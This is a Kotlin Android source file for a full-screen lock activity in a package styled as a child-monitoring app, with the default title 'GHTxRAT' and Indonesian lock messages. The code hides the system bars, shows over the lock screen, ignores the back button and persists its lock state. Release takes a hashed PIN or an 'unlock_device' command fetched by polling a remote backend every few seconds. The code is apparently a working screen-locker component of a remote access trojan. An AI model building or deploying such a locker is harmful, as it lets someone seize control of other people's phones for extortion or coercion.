package com.rifxguard.child

import android.app.Activity
import android.app.KeyguardManager
import android.content.Context
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import org.json.JSONArray
import java.net.HttpURLConnection
import java.net.URL
import android.view.View
import android.view.Window
import android.view.WindowManager
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import java.security.MessageDigest

class LockActivity : Activity() {
    companion object {
        const val EXTRA_TITLE = "title"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_PIN_HASH = "pinHash"
        const val EXTRA_HTML = "html"
        const val EXTRA_DEVICE_LOCK = "deviceLock"
        const val PREFS = "lock_state"
        const val KEY_ACTIVE = "active"
    }

    private lateinit var pinInput: EditText
    private var pinHash = ""
    private val handler = Handler(Looper.getMainLooper())
    private val poll = object : Runnable {
        override fun run() {
            pollUnlock()
            handler.postDelayed(this, 3000)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED)
        window.addFlags(WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        requestWindowFeature(Window.FEATURE_NO_TITLE)
        hideSystemUi()

        val title = intent.getStringExtra(EXTRA_TITLE) ?: "GHTxRAT"
        val message = intent.getStringExtra(EXTRA_MESSAGE) ?: "Device dikunci"
        pinHash = intent.getStringExtra(EXTRA_PIN_HASH) ?: ""
        val html = intent.getStringExtra(EXTRA_HTML).orEmpty()
        getSharedPreferences(PREFS, MODE_PRIVATE).edit()
            .putBoolean(KEY_ACTIVE, true)
            .putString("title", title)
            .putString("message", message)
            .putString("pinHash", pinHash)
            .putString("html", html)
            .apply()

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(28, 40, 28, 28)
            setBackgroundColor(0xFF090D14.toInt())
            gravity = android.view.Gravity.CENTER_HORIZONTAL
        }
        val web = WebView(this).apply {
            settings.javaScriptEnabled = false
            settings.domStorageEnabled = false
            settings.allowFileAccess = false
            settings.allowContentAccess = false
            webViewClient = WebViewClient()
            if (html.isNotBlank()) loadDataWithBaseURL("https://rifxguard.local/", html, "text/html", "UTF-8", null)
        }
        val titleView = TextView(this).apply {
            text = title
            textSize = 28f
            setTextColor(0xFFFFFFFF.toInt())
            gravity = android.view.Gravity.CENTER
        }
        val msg = TextView(this).apply {
            text = message
            textSize = 16f
            setTextColor(0xFFB9C5D6.toInt())
            gravity = android.view.Gravity.CENTER
            setPadding(0, 12, 0, 18)
        }
        pinInput = EditText(this).apply {
            hint = "PIN"
            inputType = android.text.InputType.TYPE_CLASS_NUMBER or android.text.InputType.TYPE_NUMBER_VARIATION_PASSWORD
            setSingleLine(true)
            gravity = android.view.Gravity.CENTER
            textSize = 22f
            setTextColor(0xFFFFFFFF.toInt())
            setHintTextColor(0xFF8D9AAC.toInt())
        }
        val unlock = Button(this).apply {
            text = "UNLOCK"
            setOnClickListener { verifyPin() }
        }
        if (html.isNotBlank()) root.addView(web, LinearLayout.LayoutParams(-1, 0, 1f))
        root.addView(titleView, LinearLayout.LayoutParams(-1, -2))
        root.addView(msg, LinearLayout.LayoutParams(-1, -2))
        root.addView(pinInput, LinearLayout.LayoutParams(-1, 64))
        root.addView(unlock, LinearLayout.LayoutParams(-1, 60).apply { topMargin = 18 })
        setContentView(root)
        handler.post(poll)
    }

    private fun verifyPin() {
        val entered = pinInput.text.toString()
        if (sha256(entered) != pinHash) {
            pinInput.text?.clear()
            Toast.makeText(this, "PIN salah", Toast.LENGTH_SHORT).show()
            return
        }
        getSharedPreferences(PREFS, MODE_PRIVATE).edit().clear().apply()
        finish()
    }

    private fun sha256(value: String): String = MessageDigest.getInstance("SHA-256")
        .digest(value.toByteArray()).joinToString("") { "%02x".format(it) }

    private fun hideSystemUi() {
        window.decorView.systemUiVisibility = (View.SYSTEM_UI_FLAG_FULLSCREEN or View.SYSTEM_UI_FLAG_HIDE_NAVIGATION or View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY or View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN or View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION or View.SYSTEM_UI_FLAG_LAYOUT_STABLE)
    }

    private fun pollUnlock() {
        val token = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceToken", null) ?: return
        val deviceUid = getSharedPreferences("device_config", MODE_PRIVATE).getString("deviceUid", null) ?: return
        Thread {
            try {
                val conn = URL(BuildConfigValues.BACKEND_URL.trimEnd('/') + "/api/devices/$deviceUid/commands").openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 5000
                conn.readTimeout = 7000
                conn.setRequestProperty("X-Parent-Uid", BuildConfigValues.PARENT_UID)
                conn.setRequestProperty("X-Device-Token", token)
                val code = conn.responseCode
                val body = (if (code in 200..299) conn.inputStream else conn.errorStream)?.bufferedReader()?.use { it.readText() } ?: ""
                conn.disconnect()
                if (code in 200..299) {
                    val commands = JSONArray(body)
                    for (i in 0 until commands.length()) {
                        val c = commands.getJSONObject(i)
                        if (c.optString("type") == "unlock_device") {
                            acknowledge(deviceUid, c.getString("id"), token)
                            runOnUiThread {
                                getSharedPreferences(PREFS, MODE_PRIVATE).edit().clear().apply()
                                handler.removeCallbacks(poll)
                                finish()
                            }
                            return@Thread
                        }
                    }
                }
            } catch (_: Exception) { }
        }.start()
    }

    private fun acknowledge(deviceUid: String, commandId: String, token: String) {
        try {
            val conn = URL(BuildConfigValues.BACKEND_URL.trimEnd('/') + "/api/devices/$deviceUid/commands/$commandId").openConnection() as HttpURLConnection
            conn.requestMethod = "DELETE"
            conn.connectTimeout = 5000
            conn.setRequestProperty("X-Parent-Uid", BuildConfigValues.PARENT_UID)
            conn.setRequestProperty("X-Device-Token", token)
            conn.responseCode
            conn.disconnect()
        } catch (_: Exception) { }
    }

    override fun onDestroy() {
        handler.removeCallbacks(poll)
        super.onDestroy()
    }

    override fun onBackPressed() { /* locked: ignore back */ }
}
